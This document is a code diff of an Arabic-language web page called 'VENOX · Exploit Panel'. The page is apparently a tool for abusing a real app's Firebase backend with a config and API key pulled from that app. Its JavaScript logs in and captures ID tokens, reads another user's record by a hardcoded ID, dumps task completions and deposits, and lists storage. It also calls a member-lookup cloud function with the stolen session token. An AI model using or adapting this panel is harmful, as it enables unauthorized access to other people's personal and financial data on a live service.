@@ -8,7 +8,6 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-functions-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
     
     <style>
@@ -34,10 +33,13 @@
         .btn-danger:hover { background: #dc2626; transform: translateY(-2px); }
         .btn-secondary { background: rgba(255,255,255,0.08); color: #e2e8f0; }
         .btn-secondary:hover { background: rgba(255,255,255,0.15); transform: translateY(-2px); }
+        .btn-info { background: rgba(59,130,246,0.2); color: #60a5fa; border: 1px solid rgba(59,130,246,0.3); }
+        .btn-info:hover { background: rgba(59,130,246,0.3); transform: translateY(-2px); }
         
-        .result-box { background: rgba(0,0,0,0.3); padding: 14px; border-radius: 10px; font-family: monospace; font-size: 13px; color: #94a3b8; white-space: pre-wrap; word-break: break-all; max-height: 300px; overflow: auto; margin-top: 10px; }
+        .result-box { background: rgba(0,0,0,0.3); padding: 14px; border-radius: 10px; font-family: monospace; font-size: 13px; color: #94a3b8; white-space: pre-wrap; word-break: break-all; max-height: 250px; overflow: auto; margin-top: 10px; }
         .result-box.success { border: 1px solid rgba(34,197,94,0.3); color: #4ade80; }
         .result-box.error { border: 1px solid rgba(239,68,68,0.3); color: #f87171; }
+        .result-box.warning { border: 1px solid rgba(249,115,22,0.3); color: #f97316; }
         
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
         @media (max-width: 768px) { .grid-2 { grid-template-columns: 1fr; } }
@@ -52,6 +54,9 @@
         .toast-error { background: #ef4444; }
         .toast-info { background: #3b82f6; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .uid-display { background: rgba(249,115,22,0.1); padding: 8px 14px; border-radius: 8px; border: 1px solid rgba(249,115,22,0.2); color: #f97316; font-family: monospace; font-size: 13px; display: inline-block; margin-bottom: 10px; }
+        .token-display { background: rgba(0,0,0,0.4); padding: 8px 14px; border-radius: 8px; border: 1px solid rgba(59,130,246,0.2); color: #60a5fa; font-family: monospace; font-size: 11px; display: block; word-break: break-all; margin-bottom: 10px; max-height: 80px; overflow: auto; }
     </style>
 </head>
 <body>
@@ -60,14 +65,14 @@
     <div class="header">
         <div>
             <h1>🔥 VENOX · Exploit Panel</h1>
-            <div class="subtitle">استغلال Firebase باستخدام المعلومات المستخرجة</div>
+            <div class="subtitle">كل المحاولات العملية في مكان واحد</div>
         </div>
         <span class="badge badge-connected" id="statusBadge">✅ جاهز</span>
     </div>
 
     <!-- Firebase Config -->
     <div class="card">
-        <h3>🔑 Firebase Config (مستخرج من التطبيق)</h3>
+        <h3>🔑 Firebase Config</h3>
         <pre style="background:rgba(0,0,0,0.3);padding:12px;border-radius:8px;font-size:12px;color:#94a3b8;overflow:auto;">
 apiKey: AIzaSyCV-SRgZ8Hhw6VXE0Zl0Ob0P5LPCApZPVU
 authDomain: venox-ffe5c.firebaseapp.com
@@ -89,38 +94,39 @@ storageBucket: venox-ffe5c.firebasestorage.app
 
     <!-- تسجيل الدخول -->
     <div class="card">
-        <h3>🔑 تسجيل الدخول + ID Token</h3>
+        <h3>🔑 تسجيل الدخول</h3>
         <div style="display:flex;gap:10px;flex-wrap:wrap;">
             <input type="email" id="loginEmail" placeholder="البريد الإلكتروني" style="flex:1;padding:10px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#e2e8f0;min-width:200px;">
             <input type="password" id="loginPassword" placeholder="كلمة المرور" style="flex:1;padding:10px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#e2e8f0;min-width:150px;" value="Test123!">
             <button class="btn btn-primary" onclick="login()">🔓 تسجيل</button>
         </div>
         <div id="loginResult" class="result-box">⏳ انتظر...</div>
+        <div id="tokenDisplay" class="token-display" style="display:none;"></div>
+        <div id="uidDisplay" class="uid-display" style="display:none;"></div>
     </div>
 
-    <!-- استكشاف -->
+    <!-- جميع المحاولات -->
     <div class="grid-2">
         <!-- Firestore -->
         <div class="card">
-            <h3>📄 Firestore Collections</h3>
-            <button class="btn btn-primary" onclick="scanFirestore()">🔍 فحص الكل</button>
-            <div id="firestoreResult" class="result-box">⏳ اضغط "فحص"</div>
+            <h3>📄 Firestore</h3>
+            <button class="btn btn-info" onclick="readMyUser()">👤 بياناتي</button>
+            <button class="btn btn-info" onclick="readOtherUser()">👤 مستخدم آخر</button>
+            <button class="btn btn-info" onclick="readTaskCompletions()">📋 المهام</button>
+            <button class="btn btn-info" onclick="readProfiles()">👤 بروفايل</button>
+            <button class="btn btn-info" onclick="readDeposits()">💰 إيداعات</button>
+            <button class="btn btn-secondary" onclick="clearResult('firestoreResult')">🗑️ مسح</button>
+            <div id="firestoreResult" class="result-box">⏳ اضغط زر...</div>
         </div>
 
-        <!-- Cloud Functions -->
+        <!-- Storage + Functions -->
         <div class="card">
-            <h3>☁️ Cloud Functions</h3>
-            <button class="btn btn-secondary" onclick="callFunction('venoxLookupMemberByEmail', {email:'admin@venox.com'})">📧 Lookup</button>
-            <button class="btn btn-secondary" onclick="callFunction('venoxSendEmailOtp', {email:'test@example.com'})">📨 Send OTP</button>
-            <div id="functionsResult" class="result-box">⏳ اضغط زر</div>
+            <h3>📁 Storage & ☁️ Functions</h3>
+            <button class="btn btn-info" onclick="scanStorage()">📁 فحص Storage</button>
+            <button class="btn btn-info" onclick="callFunction()">☁️ LookupMember</button>
+            <button class="btn btn-secondary" onclick="clearResult('storageResult')">🗑️ مسح</button>
+            <div id="storageResult" class="result-box">⏳ اضغط زر...</div>
         </div>
-    </div>
-
-    <!-- Storage -->
-    <div class="card">
-        <h3>📁 Firebase Storage</h3>
-        <button class="btn btn-primary" onclick="scanStorage()">🔍 فحص</button>
-        <div id="storageResult" class="result-box">⏳ اضغط "فحص"</div>
     </div>
 </div>
 
@@ -141,7 +147,9 @@ firebase.initializeApp(FIREBASE_CONFIG);
 const auth = firebase.auth();
 const db = firebase.firestore();
 const storage = firebase.storage();
-const functions = firebase.functions();
+
+let currentUid = '';
+let currentToken = '';
 
 // ============================================================
 // 📌 TOAST
@@ -156,6 +164,12 @@ function showToast(msg, type = 'info') {
     setTimeout(() => el.remove(), 4000);
 }
 
+function setResult(id, text, type = '') {
+    const el = document.getElementById(id);
+    el.textContent = text;
+    el.className = 'result-box' + (type ? ' ' + type : '');
+}
+
 // ============================================================
 // 🔐 CREATE ACCOUNT
 // ============================================================
@@ -165,30 +179,26 @@ async function createAccount() {
     const result = document.getElementById('signupResult');
     
     if (!email || !password) {
-        result.textContent = '❌ أدخل البريد وكلمة المرور';
-        result.className = 'result-box error';
+        setResult('signupResult', '❌ أدخل البريد وكلمة المرور', 'error');
         return;
     }
     
-    result.textContent = '⏳ جاري...';
-    result.className = 'result-box';
+    setResult('signupResult', '⏳ جاري...', '');
     
     try {
         const userCred = await auth.createUserWithEmailAndPassword(email, password);
-        result.textContent = `✅ تم إنشاء الحساب!\nUID: ${userCred.user.uid}\nالبريد: ${userCred.user.email}`;
-        result.className = 'result-box success';
+        setResult('signupResult', `✅ تم إنشاء الحساب!\nUID: ${userCred.user.uid}\nالبريد: ${userCred.user.email}`, 'success');
         showToast('✅ تم إنشاء الحساب', 'success');
         document.getElementById('statusBadge').className = 'badge badge-connected';
     } catch (error) {
-        result.textContent = `❌ فشل: ${error.message}`;
-        result.className = 'result-box error';
+        setResult('signupResult', `❌ فشل: ${error.message}`, 'error');
         showToast(`❌ ${error.message}`, 'error');
         document.getElementById('statusBadge').className = 'badge badge-error';
     }
 }
 
 // ============================================================
-// 🔑 LOGIN + ID Token
+// 🔑 LOGIN
 // ============================================================
 async function login() {
     const email = document.getElementById('loginEmail').value.trim();
@@ -196,106 +206,183 @@ async function login() {
     const result = document.getElementById('loginResult');
     
     if (!email || !password) {
-        result.textContent = '❌ أدخل البريد وكلمة المرور';
-        result.className = 'result-box error';
+        setResult('loginResult', '❌ أدخل البريد وكلمة المرور', 'error');
         return;
     }
     
-    result.textContent = '⏳ جاري...';
-    result.className = 'result-box';
+    setResult('loginResult', '⏳ جاري...', '');
     
     try {
         const userCred = await auth.signInWithEmailAndPassword(email, password);
         const idToken = await userCred.user.getIdToken();
-        result.textContent = `✅ تم تسجيل الدخول!\nUID: ${userCred.user.uid}\nالبريد: ${userCred.user.email}\n🔑 ID Token: ${idToken.substring(0, 50)}...`;
-        result.className = 'result-box success';
+        currentUid = userCred.user.uid;
+        currentToken = idToken;
+        
+        setResult('loginResult', `✅ تم تسجيل الدخول!\nUID: ${currentUid}\nالبريد: ${userCred.user.email}`, 'success');
+        
+        document.getElementById('uidDisplay').style.display = 'block';
+        document.getElementById('uidDisplay').textContent = `🆔 UID: ${currentUid}`;
+        document.getElementById('tokenDisplay').style.display = 'block';
+        document.getElementById('tokenDisplay').textContent = `🔑 Token: ${currentToken.substring(0, 80)}...`;
+        
         showToast('✅ تم تسجيل الدخول', 'success');
         document.getElementById('statusBadge').className = 'badge badge-connected';
-        
-        // حفظ التوكن في LocalStorage
-        localStorage.setItem('venox_idToken', idToken);
     } catch (error) {
-        result.textContent = `❌ فشل: ${error.message}`;
-        result.className = 'result-box error';
+        setResult('loginResult', `❌ فشل: ${error.message}`, 'error');
         showToast(`❌ ${error.message}`, 'error');
         document.getElementById('statusBadge').className = 'badge badge-error';
     }
 }
 
 // ============================================================
-// 📄 FIRESTORE SCAN
+// 👤 READ MY USER
 // ============================================================
-async function scanFirestore() {
-    const result = document.getElementById('firestoreResult');
-    result.textContent = '⏳ جاري فحص Firestore...';
-    result.className = 'result-box';
-    
-    const collections = ['users', 'profiles', 'deposits', 'tasks', 'referrals', 'adminEvents', 'taskSubmissions', 'taskCompletions', 'platformNotifications', 'memberNotifications'];
-    let output = '';
-    
-    for (const col of collections) {
-        try {
-            const snap = await db.collection(col).limit(2).get();
-            if (!snap.empty) {
-                const data = snap.docs.map(d => d.data());
-                output += `✅ ${col}: ${snap.size} وثيقة\n   ${JSON.stringify(data[0]).substring(0, 150)}...\n\n`;
-            } else {
-                output += `📭 ${col}: فارغ\n`;
-            }
-        } catch(e) {
-            output += `❌ ${col}: ${e.message}\n`;
-        }
+async function readMyUser() {
+    if (!currentUid) {
+        setResult('firestoreResult', '❌ سجل دخول أولاً', 'error');
+        return;
     }
-    
-    result.textContent = output || '📭 لا توجد نتائج';
-    result.className = 'result-box';
-}
-
-// ============================================================
-// ☁️ CLOUD FUNCTIONS
-// ============================================================
-async function callFunction(name, data) {
-    const result = document.getElementById('functionsResult');
-    result.textContent = `⏳ جاري استدعاء ${name}...`;
-    result.className = 'result-box';
-    
+    setResult('firestoreResult', '⏳ جاري...', '');
     try {
-        const callable = functions.httpsCallable(name);
-        const response = await callable(data);
-        result.textContent = `✅ ${name}\n📦 ${JSON.stringify(response.data, null, 2)}`;
-        result.className = 'result-box success';
-    } catch(error) {
-        result.textContent = `❌ ${name}\n${error.message}`;
-        result.className = 'result-box error';
+        const doc = await db.collection('users').doc(currentUid).get();
+        if (doc.exists) {
+            setResult('firestoreResult', `✅ بياناتي:\n${JSON.stringify(doc.data(), null, 2)}`, 'success');
+        } else {
+            setResult('firestoreResult', '📭 لا توجد بيانات', 'warning');
+        }
+    } catch(e) {
+        setResult('firestoreResult', `❌ ${e.message}`, 'error');
     }
 }
 
 // ============================================================
-// 📁 STORAGE SCAN
+// 👤 READ OTHER USER
+// ============================================================
+async function readOtherUser() {
+    setResult('firestoreResult', '⏳ جاري...', '');
+    try {
+        const doc = await db.collection('users').doc('3NMRA9D5DEYPTOU').get();
+        if (doc.exists) {
+            setResult('firestoreResult', `👤 مستخدم آخر:\n${JSON.stringify(doc.data(), null, 2)}`, 'success');
+        } else {
+            setResult('firestoreResult', '📭 لا توجد بيانات', 'warning');
+        }
+    } catch(e) {
+        setResult('firestoreResult', `❌ ${e.message}`, 'error');
+    }
+}
+
+// ============================================================
+// 📋 READ TASK COMPLETIONS
+// ============================================================
+async function readTaskCompletions() {
+    setResult('firestoreResult', '⏳ جاري...', '');
+    try {
+        const snap = await db.collection('taskCompletions').get();
+        let output = '📋 المهام:\n';
+        snap.forEach(doc => {
+            output += `  ${JSON.stringify(doc.data())}\n`;
+        });
+        setResult('firestoreResult', output || '📭 لا توجد مهام', 'success');
+    } catch(e) {
+        setResult('firestoreResult', `❌ ${e.message}`, 'error');
+    }
+}
+
+// ============================================================
+// 👤 READ PROFILES
+// ============================================================
+async function readProfiles() {
+    if (!currentUid) {
+        setResult('firestoreResult', '❌ سجل دخول أولاً', 'error');
+        return;
+    }
+    setResult('firestoreResult', '⏳ جاري...', '');
+    try {
+        const doc = await db.collection('profiles').doc(currentUid).get();
+        if (doc.exists) {
+            setResult('firestoreResult', `👤 بروفايل:\n${JSON.stringify(doc.data(), null, 2)}`, 'success');
+        } else {
+            setResult('firestoreResult', '📭 لا توجد بيانات', 'warning');
+        }
+    } catch(e) {
+        setResult('firestoreResult', `❌ ${e.message}`, 'error');
+    }
+}
+
+// ============================================================
+// 💰 READ DEPOSITS
+// ============================================================
+async function readDeposits() {
+    if (!currentUid) {
+        setResult('firestoreResult', '❌ سجل دخول أولاً', 'error');
+        return;
+    }
+    setResult('firestoreResult', '⏳ جاري...', '');
+    try {
+        const snap = await db.collection('deposits').where('userId', '==', currentUid).get();
+        let output = '💰 الإيداعات:\n';
+        snap.forEach(doc => {
+            output += `  ${JSON.stringify(doc.data())}\n`;
+        });
+        setResult('firestoreResult', output || '📭 لا توجد إيداعات', 'success');
+    } catch(e) {
+        setResult('firestoreResult', `❌ ${e.message}`, 'error');
+    }
+}
+
+// ============================================================
+// 📁 SCAN STORAGE
 // ============================================================
 async function scanStorage() {
-    const result = document.getElementById('storageResult');
-    result.textContent = '⏳ جاري فحص Storage...';
-    result.className = 'result-box';
-    
+    setResult('storageResult', '⏳ جاري...', '');
     try {
         const listRef = storage.ref('/');
         const res = await listRef.listAll();
+        let output = '📁 Storage:\n';
         if (res.items.length === 0 && res.prefixes.length === 0) {
-            result.textContent = '📭 Storage فارغ (أو ممنوع)';
-            result.className = 'result-box';
-            return;
+            output += '📭 فارغ أو ممنوع';
+        } else {
+            res.items.forEach(item => output += `  📄 ${item.name}\n`);
+            res.prefixes.forEach(prefix => output += `  📁 ${prefix.name}/\n`);
         }
-        let output = '📁 الملفات:\n';
-        res.items.forEach(item => output += `  📄 ${item.name}\n`);
-        output += '\n📂 المجلدات:\n';
-        res.prefixes.forEach(prefix => output += `  📁 ${prefix.name}/\n`);
-        result.textContent = output;
-        result.className = 'result-box success';
+        setResult('storageResult', output, 'success');
     } catch(e) {
-        result.textContent = `❌ فشل: ${e.message}`;
-        result.className = 'result-box error';
+        setResult('storageResult', `❌ ${e.message}`, 'error');
     }
+}
+
+// ============================================================
+// ☁️ CALL FUNCTION
+// ============================================================
+async function callFunction() {
+    if (!currentUid) {
+        setResult('storageResult', '❌ سجل دخول أولاً', 'error');
+        return;
+    }
+    setResult('storageResult', '⏳ جاري...', '');
+    try {
+        const response = await fetch('https://us-central1-venox-ffe5c.cloudfunctions.net/venoxLookupMemberByEmail', {
+            method: 'POST',
+            headers: {
+                'Authorization': 'Bearer ' + currentToken,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email: document.getElementById('loginEmail').value.trim() || 'test@example.com' })
+        });
+        const data = await response.json();
+        setResult('storageResult', `☁️ Function Response:\n${JSON.stringify(data, null, 2)}`, data.error ? 'error' : 'success');
+    } catch(e) {
+        setResult('storageResult', `❌ ${e.message}`, 'error');
+    }
+}
+
+// ============================================================
+// 🗑️ CLEAR RESULT
+// ============================================================
+function clearResult(id) {
+    document.getElementById(id).textContent = '⏳ اضغط زر...';
+    document.getElementById(id).className = 'result-box';
 }
 </script>
 
